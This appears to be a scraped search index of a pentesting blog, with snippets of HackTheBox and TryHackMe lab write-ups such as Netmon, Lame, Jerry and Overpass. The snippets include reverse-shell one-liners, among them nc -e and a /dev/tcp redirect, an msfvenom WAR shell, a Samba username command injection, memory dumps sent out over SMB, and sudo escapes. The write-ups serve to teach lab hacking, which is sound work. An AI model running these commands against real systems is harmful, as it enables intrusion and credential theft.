C:\\Users\\Chase\\Desktop&gt; ./procdump.exe -accepteula -ma lsass.exe lsass.dmpProcDump v11.0 - Sysinternals process dump utilityCopyright (C) 2009-2022 Mark Russinovich and Andrew RichardsSysinternals - www.sysinternals.comError opening lsass.exe (628):Access is denied. (0x00000005, 5)If we list for the process we can see that firefox is running:*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; get-processHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 464 17 2056 5376 372 0 csrss 291 13 2308 5280 484 1 csrss 362 15 3548 14776 4536 1 ctfmon 250 14 3928 13424 3536 0 dllhost 166 9 1856 9736 0.03 4064 1 dllhost 618 32 29368 57672 976 1 dwm 1499 58 23692 79832 4764 1 explorer 401 36 49192 108544 2.92 4092 1 firefox 347 20 10216 35624 0.06 4808 1 firefox 1068 75 181648 258844 8.56 5444 1 firefox 378 29 29424 65740 0.88 6216 1 firefox 355 25 16416 38856 0.58 6632 1 firefox 49 6 1796 4712 752 1 fontdrvhost 49 6 1496 3920 760 0 fontdrvhost 0 0 56 8 0 0 Idle 967 23 5792 14996 628 0 lsass 223 13 2976 10328 3840 0 msdtc 0 12 348 15720 88 0 RegistryList all the firefox process:*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; get-process -name firefoxHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 401 36 49196 352524 2.92 4092 1 firefox 347 20 10216 288588 0.06 4808 1 firefox 1092 76 181876 544200 8.56 5444 1 firefox 378 29 29552 313972 0.88 6216 1 firefox 355 25 16416 297452 0.58 6632 1 firefoxNow get the dmp of the all the process:*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; .\\procdump.exe -ma 4092 firefox-1.dmp*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; .\\procdump.exe -ma 4808 firefox-2.dmp...Start a smb server in the attack host:$ sudo smbserver.py share -smb2support /tmp/ -user test -password passAnd upload the file:*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; net use n: \\\\10.10.14.4\\share /user:test pass*Evil-WinRM* PS C:\\Users\\Chase\\Desktop&gt; Out-File \\\\10.10.14.4\\share\\firefox-1.dmpGrepping the files for password we found the following line:login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZWe can try login with this credentials:$ crackmapexec winrm 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'SMB 10.10.10.149 5985 NONE [*] None (name:10.10.10.149) (domain:None)HTTP 10.10.10.149 5985 NONE [*] http://10.10.10.149:5985/wsmanWINRM 10.10.10.149 5985 NONE [+] None\\Administrator:4dD!5}x/re8]FBuZ (Pwn3d!)$ evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;" }, { "title": "HTB | Netmon", "url": "/pentesting/htb/machines/netmon", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy, machines", "date": "2022-12-24 00:00:00 +0100", "snippet": "FingerprintScanThe scan show us:21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 02-02-19 11:18PM 1024 .rnd| 02-25-19 09:15PM &lt;DIR&gt; inetpub| 07-16-16 08:18AM &lt;DIR&gt; PerfLogs| 02-25-19 09:56PM &lt;DIR&gt; Program Files| 02-02-19 11:28PM &lt;DIR&gt; Program Files (x86)| 02-03-19 07:08AM &lt;DIR&gt; Users|_02-25-19 10:49PM &lt;DIR&gt; Windows| ftp-syst: |_ SYST: Windows_NT80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)|_http-trane-info: Problem with XML parsing of /evox/about|_http-server-header: PRTG/18.1.37.13946| http-title: Welcome | PRTG Network Monitor (NETMON)|_Requested resource was /index.htm135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.047001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsEnumerationFTPThe anonymous user is enable, with this command all the ftp can be downloaded:wget -m --no-passive ftp://anonymous@10.10.10.152But the C:\\Users\\Administrator folder is not accesible. Accesing the config folder is also blocked:ftp&gt; cd Windows250 CWD command successful.ftp&gt; cd config550 The system cannot find the file specified.But we have access to the C:\\Users\\Public or the C:\\inetpub. In the logs there is a reference to a WebManagementShell:2019-02-26 02:18:24 10.10.10.152 POST /Service.axd Module=WebObjects&amp;Method=GetSite 8172 netmon\\administrator 10.10.14.2 WebManagementShell|7.0.0.0|4.0.30319.42000|System.Windows.Forms.Control - 200 0 0 276All available users in the system can be seen:ftp&gt; ls -a229 Entering Extended Passive Mode (|||50599|)150 Opening ASCII mode data connection.02-25-19 10:44PM &lt;DIR&gt; Administrator07-16-16 08:28AM &lt;DIR&gt; All Users02-03-19 07:05AM &lt;DIR&gt; Default07-16-16 08:28AM &lt;DIR&gt; Default User07-16-16 08:16AM 174 desktop.ini02-02-19 11:35PM &lt;DIR&gt; PublicInside All Users there is a bunch of them, but one has a different name, Paessler. There we have the folder PRTG Network Monitor.ftp&gt; ls229 Entering Extended Passive Mode (|||50695|)125 Data connection already open; Transfer starting.12-24-22 07:28AM &lt;DIR&gt; Configuration Auto-Backups12-24-22 06:47AM &lt;DIR&gt; Log Database02-02-19 11:18PM &lt;DIR&gt; Logs (Debug)02-02-19 11:18PM &lt;DIR&gt; Logs (Sensors)02-02-19 11:18PM &lt;DIR&gt; Logs (System)12-24-22 06:47AM &lt;DIR&gt; Logs (Web Server)12-24-22 06:52AM &lt;DIR&gt; Monitoring Database02-25-19 09:54PM 1189697 PRTG Configuration.dat02-25-19 09:54PM 1189697 PRTG Configuration.old07-14-18 02:13AM 1153755 PRTG Configuration.old.bak12-24-22 07:28AM 1680579 PRTG Graph Data Cache.dat02-25-19 10:00PM &lt;DIR&gt; Report PDFs02-02-19 11:18PM &lt;DIR&gt; System Information Database02-02-19 11:40PM &lt;DIR&gt; Ticket Database02-02-19 11:18PM &lt;DIR&gt; ToDo DatabaseDownload the config file:ftp&gt; get \"PRTG Configuration.dat\"There we can find the following:\t\t\t\t\t\t\t\t&lt;login&gt; prtgadmin &lt;/login&gt; &lt;name&gt; PRTG System Administrator &lt;/name&gt; &lt;ownerid&gt; 100 &lt;/ownerid&gt; &lt;password&gt; &lt;flags&gt; &lt;encrypted/&gt; &lt;/flags&gt; &lt;cell col=\"0\" crypt=\"PRTG\"&gt; JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA====== &lt;/cell&gt; &lt;cell col=\"1\" crypt=\"PRTG\"&gt; OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW &lt;/cell&gt; &lt;/password&gt;We search for this user in the three config files we have in the FTP:$ grep -C 10 prtgadmin 'PRTG Configuration.dat'$ grep -C 10 prtgadmin 'PRTG Configuration.old'$ grep -C 10 prtgadmin 'PRTG Configuration.old.bak'Finally, we found cleartext credentials:&lt;dbpassword&gt;\t&lt;!-- User: prtgadmin --&gt;\tPrTg@dmin2018&lt;/dbpassword&gt;HTTPThere is a page with a login prompt for access PRTG Network Monitor. The previous credentials will not work at first, but after changing the year to 2019 it will work. The finals credentials are prtgadmin:PrTg@dmin2019.If we look into the source code we can get the version inside a script:(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','__ga');__ga('create', 'UA-154425-18', {'appId':'-10','appName':'PRTG Network Monitor (NETMON)','appVersion':'18.1.37.13946'});But once logged in, we can get the exact version: 18.1.37.13946. Searching for exploits in this version:$ searchsploit PRTG--------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------- ---------------------------------PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution | windows/webapps/46527.shThe webpage on the port 47001 and 5985 show a error 404. Fuzzing will not show any other page.FootprintPrivilege EscalationWe will use this exploit, from a commit in the same exploit in Python2:$ python3 CVE-2018-9276-py3.py -i 10.10.10.152 -p 80 --lhost 10.10.14.3 --lport 80 --password 'PrTg@dmin2019'C:\\Windows\\system32&gt;whoamint authority\\system" }, { "title": "HTB | Lame", "url": "/pentesting/htb/machines/lame", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-12-23 00:00:00 +0100", "snippet": "FingerprintScanWith the scan we can get the following open ports:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4| ftp-syst: | STAT: | FTP server status:| Connected to 10.10.14.3| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| vsFTPd 2.3.4 - secure, fast, stable|_End of status|_ftp-anon: Anonymous FTP login allowed (FTP code 230)22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: | 1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)|_ 2048 5656240f211ddea72bae61b1243de8f3 (RSA)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelEnumerationFTPA critical CVE associated with this version can be found. Also, the anonymous login is enable:$ ftp anonymous@10.10.10.3Connected to 10.10.10.3.220 (vsFTPd 2.3.4)331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt;Everything can be download with the following command:wget -m --no-passive ftp://anonymous@10.10.10.3The FTP server seems to be empty.SSHThis version of SSH is vulnerable to an enumeration of user:password. But the server only allow RSA key login.SMBA severe CVE is found for this one. Searching for it doesn’t give any success. We downloaded the nse file and tried it:nmap -p445 --script samba-vuln-cve-2012-1182.nse -Pn 10.10.10.3nmap -p139 --script samba-vuln-cve-2012-1182.nse -Pn 10.10.10.3But the allowed folders can be enumerated:$ smbclient -N -L \\\\\\\\10.10.10.3\\\\ Anonymous login successful Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (lame server (Samba 3.0.20-Debian))Reconnecting with SMB1 for workgroup listing.Anonymous login successful Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP LAME ```### distccdOn the other hand, searching for this vulnerability came to many payloads. Running the following [nse](https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse) against the target show it is vulnerable:```console$ nmap -p3632 --script distcc-cve2004-2687.nse -Pn 10.10.10.3PORT STATE SERVICE3632/tcp open distccd| distcc-cve2004-2687: | VULNERABLE:| distcc Daemon Command Execution| State: VULNERABLE (Exploitable)| IDs: CVE:CVE-2004-2687| Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)| Allows executing of arbitrary commands on systems running distccd 3.1 and| earlier. The vulnerability is the consequence of weak service configuration.| | Disclosure date: 2002-02-01| Extra information:| | uid=1(daemon) gid=1(daemon) groups=1(daemon)| | References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687| https://distcc.github.io/security.html|_ https://nvd.nist.gov/vuln/detail/CVE-2004-2687FootprintInitial AccessThe SMB server can be access without credentials:smbclient -N \\\\\\\\10.10.10.3\\\\tmpWe know that is a vulnerable version, for example this CVE. We found a exploit for metasploit, where refers to a username injection like:username = \"/=`nohup \" + payload.encoded + \"`\"We can try this by ourselves.Privilege EscalationWith CrackMapExec we can send logins attemps. Openning a netcat listener and sending the following command:crackmapexec smb 10.10.10.3 -u './=`nohup nc -e /bin/sh 10.10.14.3 80`' -p ''Will give us the root reverse shell:$ sudo nc -lvnp 80listening on [any] 80 ...connect to [10.10.14.3] from (UNKNOWN) [10.10.10.3] 40648whoamiroot" }, { "title": "HTB | Jerry", "url": "/pentesting/htb/machines/jerry", "categories": "Pentesting, HackTheBox", "tags": "htb, windows, easy, machines", "date": "2022-12-23 00:00:00 +0100", "snippet": "FingerprintScanThe scan only show us:PORT STATE SERVICE VERSION8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1|_http-title: Apache Tomcat/7.0.88|_http-server-header: Apache-Coyote/1.1|_http-favicon: Apache TomcatEnumerationThe default page can be seen in the port 8080:![][/assets/img/hackthebox/labs/jerry/Pasted image 20221223203436.png]Every administrator page ask for credentials. Finally, the credentails admin:admin will work, but this will not grant access to the Host Manager panel. But we can see there a reference to some possible credentials:&lt;role rolename=\"admin-gui\"/&gt;&lt;user username=\"tomcat\" password=\"s3cret\" roles=\"admin-gui\"/&gt;With these credentials we can now enter in the Manager App.FootprintInitial AccessFor this version we can search for the CVE-2017-12617, without success manually…:&lt;% out.write(\"&lt;html&gt;&lt;body&gt;&lt;h3&gt;[+] JSP file successfully uploaded via curl and JSP out.write executed.&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;\"); %&gt;$ curl -X PUT http://10.10.10.95:8080/test.jsp/ -d @- &lt; test.jsp$ curl http://10.10.10.95:8080/test.jsp &lt;html&gt;&lt;head&gt;&lt;title&gt;Apache Tomcat/7.0.88 - Error report&lt;/title&gt;…or automatized:$ python3 42966.py -u http://10.10.10.95:8080/Poc Filename Poc.jspNot Vulnerable to CVE-2017-12617 But we can try an upload attack of a WAR file. This is a basic Tomcat attack. First we create the shell:msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=80 -f war &gt; shell.warStart a netcat and upload the file. Now we have a new entry:![][/assets/img/hackthebox/labs/jerry/Pasted image 20221223234606.png]Loading the web in the /shell path will start the reverse shell.$ nc -lvnp 80 listening on [any] 80 ...connect to [10.10.14.3] from (UNKNOWN) [10.10.10.95] 49192Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.C:\\apache-tomcat-7.0.88&gt;whoamiwhoamint authority\\systemWe are currently Administrator, so there aren’t privilege escalation." }, { "title": "TryHackMe | Overpass", "url": "/pentesting/tryhackme/overpass", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-10-01 00:00:00 +0200", "snippet": "FootholdThe nmap show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)| 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)|_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: OverpassWe can fuzz the web:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.223.211/FUZZ'\tcss [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 65ms]\tadmin [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 66ms]\timg [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 60ms]\tdownloads [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 53ms]\taboutus [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 57ms]\t [Status: 200, Size: 2431, Words: 582, Lines: 53, Duration: 68ms]In the /downloads page we found some binaries we can inspect. We found an /admin with a login. In the source code we can find a /login.js with some vulnerable code:if (statusOrCookie === \"Incorrect credentials\") { loginStatus.textContent = \"Incorrect Credentials\" passwordBox.value=\"\" } else { Cookies.set(\"SessionToken\",statusOrCookie) window.location = \"/admin\" }FootholdIntercept the request of login in Burp. Now, right click and select Do intercept &gt; Response to this request. Forward the petition and modify the response as from:HTTP/1.1 200 OKDate: Fri, 30 Sep 2022 21:50:12 GMTContent-Length: 21Content-Type: text/plain; charset=utf-8Connection: closeIncorrect credentialsTo:HTTP/1.1 302 FOUNDDate: Fri, 30 Sep 2022 21:50:12 GMTContent-Length: 21Content-Type: text/plain; charset=utf-8Connection: closelocation: /adminForward the request and we should get an RSA. When we try logging we get the following error:zero@pio$ ssh james@10.10.223.211 -i rsa\tEnter passphrase for key 'rsa':We can use john to get the password:zero@pio$ ssh2john rsazero@pio$ john --wordlist=/usr/share/wordlists/rockyou.txt key\tjames13 (rsa)Privilege EscalationWe can see a cronjob running:zero@pio$ cat /etc/crontab\t...\t* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bashWe can see the script in the /downloads page. We can see which files we have write access as well as cronjob:james@overpass-prod:~$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null\t/etc/hosts\t/sys/kernel/security/apparmor/.remove\t/sys/kernel/security/apparmor/.replace\t/sys/kernel/security/apparmor/.load\t/sys/kernel/security/apparmor/.access\t/sys/fs/cgroup/memory/cgroup.event_control\t/procWe can try modifying /etc/hosts. There we can see the server domain:james@overpass-prod:~$ cat /etc/hosts\t127.0.0.1 localhost\t127.0.1.1 overpass-prod\t127.0.0.1 overpass.thm\t# The following lines are desirable for IPv6 capable hosts\t::1 ip6-localhost ip6-loopback\tfe00::0 ip6-localnet\tff00::0 ip6-mcastprefix\tff02::1 ip6-allnodes\tff02::2 ip6-allroutersCreate the following directory in our machine:└── downloads └── src └── buildscript.shAdd a one-liner in the buildscript.sh:sh -i &gt;&amp; /dev/tcp/10.18.2.17/443 0&gt;&amp;1Start a netcat (nc -lvnp 443) and an http server (python3 -m http.server 80) and we should receive our shell." }, { "title": "TryHackMe | Bounty Hacker", "url": "/pentesting/tryhackme/bounty-hacker", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-09-29 00:00:00 +0200", "snippet": "FootholdThe nmap show:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)| 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)|_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)Try logging with anonymous is successful. Now we try getting all the ftp:zero@pio$ wget -m --no-passive ftp://anonymous@10.10.111.251FingerprintWe found there a list of possible passwords plus a file signed by Lin. We can try bruteforcing the other service we have, ssh:zero@pio$ hydra -l lin -P locks.txt ssh://10.10.111.251\t[22][ssh] host: 10.10.111.251 login: lin password: RedDr4gonSynd1cat3Privilege EscalationWe can see that we can use tar:lin@bountyhacker:$ sudo -l\t\t(root) /bin/tarWe can use this GTFObin to get a quick access:lin@bountyhacker:$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" }, { "title": "TryHackMe | Agent Sudo", "url": "/pentesting/tryhackme/agent-sudo", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-09-29 00:00:00 +0200", "snippet": "FootholdThe nmap show:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)| 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)|_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: AnnoucementWe can see a difference in the page if we sent R as the user-agent:zero@pio$ curl 'http://10.10.191.204/'\t&lt;!DocType html&gt;\t&lt;html&gt;\t&lt;head&gt;\t &lt;title&gt;Annoucement&lt;/title&gt;\t&lt;/head&gt;\t\t&lt;body&gt;\t&lt;p&gt;\t Dear agents,\t &lt;br&gt;&lt;br&gt;\t Use your own &lt;b&gt;codename&lt;/b&gt; as user-agent to access the site.\t &lt;br&gt;&lt;br&gt;\t From,&lt;br&gt;\t Agent R\t&lt;/p&gt;\t&lt;/body&gt;\t&lt;/html&gt;zero@pio$ curl 'http://10.10.191.204/' -A 'R'\tWhat are you doing! Are you one of the 25 employees? If not, I going to report this incident\t&lt;!DocType html&gt;\t&lt;html&gt;\t&lt;head&gt;\t &lt;title&gt;Annoucement&lt;/title&gt;\t&lt;/head&gt;\t\t&lt;body&gt;\t&lt;p&gt;\t Dear agents,\t &lt;br&gt;&lt;br&gt;\t Use your own &lt;b&gt;codename&lt;/b&gt; as user-agent to access the site.\t &lt;br&gt;&lt;br&gt;\t From,&lt;br&gt;\t Agent R\t&lt;/p&gt;\t&lt;/body&gt;\t&lt;/html&gt;Testing some User-agent we can see a redirection for User-agent: C:zero@pio$ curl -I 'http://10.10.191.204/' -H 'User-agent: C' \tHTTP/1.1 302 Found\tDate: Thu, 29 Sep 2022 17:44:11 GMT\tServer: Apache/2.4.29 (Ubuntu)\tLocation: agent_C_attention.php\tContent-Type: text/html; charset=UTF-8Let’s follow it:zero@pio$ curl -iL 'http://10.10.191.204/' -H 'User-agent: C' \tHTTP/1.1 200 OK\tDate: Thu, 29 Sep 2022 17:44:51 GMT\tServer: Apache/2.4.29 (Ubuntu)\tVary: Accept-Encoding\tContent-Length: 177\tContent-Type: text/html; charset=UTF-8\t\tAttention chris, &lt;br&gt;&lt;br&gt;\t\tDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! &lt;br&gt;&lt;br&gt;\t\tFrom,&lt;br&gt;\tAgent RFingerprintLet’s try bruteforcing with this user the ftp:zero@pio$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.191.204\t[21][ftp] host: 10.10.191.204 login: chris password: crystalInside the ftp we found three files, two images and a txt saying that there is a password inside of the images. We can see that one of them have a ZIP:zero@pio$ binwalk cutie.png \tDECIMAL HEXADECIMAL DESCRIPTION\t--------------------------------------------------------------------------------\t0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced\t869 0x365 Zlib compressed data, best compression\t34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\t34820 0x8804 End of Zip archive, footer length: 22 zero@pio$ binwalk cute-alien.jpg \tDECIMAL HEXADECIMAL DESCRIPTION\t--------------------------------------------------------------------------------\t0 0x0 JPEG image data, JFIF standard 1.01We can get the ZIP as:zero@pio$ binwalk cutie.png -ezero@pio$ cd _cutie.png.extractedzero@pio$ ll\t-rw-r--r-- 1 zeropio zeropio 279312 Sep 29 18:54 365\t-rw-r--r-- 1 zeropio zeropio 33973 Sep 29 18:54 365.zlib\t-rw-r--r-- 1 zeropio zeropio 280 Sep 29 18:54 8702.zip\t-rw-r--r-- 1 zeropio zeropio 0 Oct 29 2019 To_agentR.txtLet’s try getting the ZIP password:zero@pio$ zip2john 8702.zipzero@pio$ john hash --wordlist=/usr/share/wordlists/rockyou.txt\talien (8702.zip/To_agentR.txt)Inside we found the file To_agentR.txt with the contents:Agent C,We need to send the picture to 'QXJlYTUx' as soon as possible!By,Agent RWe can decode it:zero@pio$ echo \"QXJlYTUx\" | base64 -d\tArea51We can use this password with steghide:zero@pio$ steghide extract -sf cute-alien.jpg \tEnter passphrase: \twrote extracted data to \"message.txt\".There we can found:Hi james,Glad you find this message. Your login password is hackerrules!Don't ask me why the password look cheesy, ask agent R who set this password for you.Your buddy,chrisWe can now login as ssh.Privilege EscalationWe can see some weird privileges:zero@pio$ sudo -l\tMatching Defaults entries for james on agent-sudo:\t env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\t\tUser james may run the following commands on agent-sudo:\t (ALL, !root) /bin/bashWe found this CVE. We can easily exploit it with:james@agent-sudo:~$ sudo -u#-1 /bin/bashroot@agent-sudo:~# whoami\troot" }, { "title": "TryHackMe | SimpleCTF", "url": "/pentesting/tryhackme/simplectf", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-09-28 00:00:00 +0200", "snippet": "FootholdThe nmap show:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.18.2.17| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can't get directory listing: TIMEOUT80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-robots.txt: 2 disallowed entries |_/ /openemr-5_0_1_3 |_http-server-header: Apache/2.4.18 (Ubuntu)2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)| 256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)|_ 256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)We try logging to the ftp as anonymous:zero@pio$ ftp anonymous@10.10.69.153 \tConnected to 10.10.69.153.\t220 (vsFTPd 3.0.3)\t230 Login successful.\tRemote system type is UNIX.\tUsing binary mode to transfer files.ftp&gt; ls\t229 Entering Extended Passive Mode (|||41322|)It seems we can access but no execute commands, so we download the whole ftp:zero@pio$ wget -m --no-passive ftp://anonymous@10.10.69.153There we can find a file: ForMitch.txt:zero@pio$ cat ForMitch.txt \tDammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!The webserver show a default Apache page, so we can try fuzzing:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.69.153/FUZZ'\tsimple [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 159ms]\tserver-status [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 105ms]\t [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 107ms]Under /simple/ we can see they are using CMS Made Simple version 2.2.8. This version is vulnerable to CVE-2019-9053.FingerprintWith this exploit we can get an valid user:zero@pio$ python2 46635.py -u 'http://10.10.69.153/simple/' --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txtNow we can use hydra to get a password:zero@pio$ hydra -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt ssh://10.10.69.153 -s 2222\t[2222][ssh] host: 10.10.69.153 login: mitch password: secretNow we can login in the system.Privilege EscalationWe can see in the server that we have sudo permission over vim. With GTFObins we can quickly escalate:$ sudo -l\tUser mitch may run the following commands on Machine:\t (root) NOPASSWD: /usr/bin/vim$ sudo vim -c ':!/bin/sh'# whoami\troot" }, { "title": "TryHackMe | Attacktive Directory", "url": "/pentesting/tryhackme/attacktive-directory", "categories": "Pentesting, TryHackMe", "tags": "thm, windows", "date": "2022-09-28 00:00:00 +0200", "snippet": "FootholdThe nmap show:PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: IIS Windows Server88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-09-27 17:56:38Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local| Not valid before: 2022-09-26T17:53:43|_Not valid after: 2023-03-28T17:53:43| rdp-ntlm-info: | Target_Name: THM-AD| NetBIOS_Domain_Name: THM-AD| NetBIOS_Computer_Name: ATTACKTIVEDIREC| DNS_Domain_Name: spookysec.local| DNS_Computer_Name: AttacktiveDirectory.spookysec.local| Product_Version: 10.0.17763|_ System_Time: 2022-09-27T17:56:54+00:00|_ssl-date: 2022-09-27T17:57:02+00:00; 0s from scanner time.We will start by enumerating the users in the AD:zero@pio$ kerbrute userenum 